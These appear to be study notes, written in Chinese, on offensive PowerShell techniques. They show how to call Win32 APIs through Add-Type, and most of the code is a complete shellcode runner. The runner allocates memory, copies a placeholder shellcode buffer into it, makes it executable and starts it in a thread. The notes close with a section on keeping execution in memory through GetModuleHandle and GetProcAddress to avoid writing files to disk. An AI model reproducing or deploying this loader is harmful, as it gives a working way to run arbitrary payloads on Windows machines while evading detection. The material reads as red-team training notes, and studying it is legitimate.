# PowerShell Shellcode Runner
## Calling Win32 APIs from PowerShell
- Win32 API 方法就如同在VBA引入一樣，只是在使用上就如同C#，需要重新建構資料結構、函式
- 其中又以C# 中 System.Runtime.InteropServices 可以支援平台中的調用。
### MessageBox
- C language
`int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);`
- C# Invoke
`[DllImport("user32.dll", SetLastError = true, CharSet= CharSet.Auto)]
public static extern int MessageBox(int hWnd, String text, String caption, uint type);`
#### Example
```
$User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 {
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MessageBox(IntPtr hWnd, String text,
String caption, int options);
}"@
Add-Type $User32 
```
- Add-Type 會以指定的編譯器來編譯原始程式碼。 預設為CSharp 編譯器
- `[User32]::MessageBox(0, "This is an alert", "MyBox", 0)`
### Porting Shellcode Runner to PowerShell
```
$Win32 = @"using System;using System.Runtime.InteropServices;public class Win32 {
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll",CharSet=CharSet.Ansi)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll", SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);} 
"@

Add-Type $Win32 

Enum PageProtection{
PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_WRITECOPY = 0x08
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_WRITECOPY = 0x80
PAGE_GUARD = 0x100
PAGE_NOCACHE = 0x200
PAGE_WRITECOMBINE = 0x400
}

[Byte[]] $buf = {shellcode}

$oldflag = [UInt32]0
$size = $buf.Length

[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x3000,[PageProtection]::PAGE_READWRITE.value__);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
[Win32]::VirtualProtect($addr,[UInt32]3,[PageProtection]::PAGE_EXECUTE_READ.value__,[ref]$oldflag);
$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF");
```
- Porting Shellcode 的方式會暫時產生編譯暫存檔所以不是真正的無檔案執行的方式
- `[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname`
- ![圖片1](https://user-images.githubusercontent.com/81568292/137419802-eed0c07c-fbc1-47a4-bd32-dd82eda43167.png)
## Keep PowerShell in Memory
- Add-Type 關鍵字讓我們可以使用 .NET 框架來編譯 C# 包含 Win32 API 定義的呼叫的程式碼。
- 編譯過程是由 Visual C# 編譯器或 csc 執行，但這樣的行為，C#程式碼和編譯後的暫存檔案將會被臨時寫入硬碟中，就沒有達到無檔案的方式。
- 為了讓我們的程式碼持續留存在記憶體中而不被寫入硬碟中，必須改用UnsafeNativeMethods尋找已存在的函式直接調用，利用兩種函式**GetModuleHandle、GetProcAddress**尋找存在於 Win API 中的其他函式。
